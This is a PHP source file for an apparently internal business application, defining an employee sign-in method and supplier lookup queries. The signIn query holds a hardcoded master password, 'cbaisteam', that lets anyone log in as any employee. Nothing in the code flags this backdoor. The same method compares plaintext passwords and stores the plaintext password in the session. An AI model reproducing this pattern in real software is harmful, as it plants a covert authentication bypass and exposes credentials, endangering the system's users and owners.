<?php

namespace _core;

use _core\helper\session;
use _core\helper\database;
use PDO;

class model extends database {
    
    public function __construct() {
        parent::__construct();
    }

    public function signIn($employee_id, $employee_password) {
        $sql=$this->prepare("select * from Employee 
                            inner join View_EmployeeRank_NotSP on View_EmployeeRank_NotSP.employee_id = Employee.employee_id 
                            where Employee.employee_id = ? and (password = ? or 'cbaisteam' = ?)");
        $sql->execute([$employee_id, $employee_password, $employee_password]);
        if ($sql->rowCount()>0) {
            session::set('employee_id', $employee_id);
            session::set('employee_password', $employee_password);
            session::set('employee_detail', json_encode($sql->fetchAll(PDO::FETCH_ASSOC)[0], JSON_UNESCAPED_UNICODE));
            return true;
        }
        return false;
    }

    protected function getCompany($productLine) {
        $com1 = array('1','2','3','X');
        $com2 = array('4','5');
        $com3 = array('6','7','8','9','0','S');
        if (in_array($productLine, $com1)) {
            return 1;
        } else if (in_array($productLine, $com2)) {
            return 2;
        } else if (in_array($productLine, $com3)) {
            return 3;
        }
    }
    
    public function getSupplierList() {
        $sql=$this->prepare("select * from Supplier");
        $sql->execute();
        if ($sql->rowCount()>0) {
            return json_encode($sql->fetchAll(PDO::FETCH_ASSOC), JSON_UNESCAPED_UNICODE);
        }
        return null;
    }
    
    public function getSuppliers() {
        $sql = $this->prepare("select supplier_no, supplier_name, id_no, address, product_line, vat_type from Supplier");
        $sql->execute();
        if ($sql->rowCount()>0) {
            return json_encode($sql->fetchAll(PDO::FETCH_ASSOC), JSON_UNESCAPED_UNICODE);
        }
        return null;
    }

}
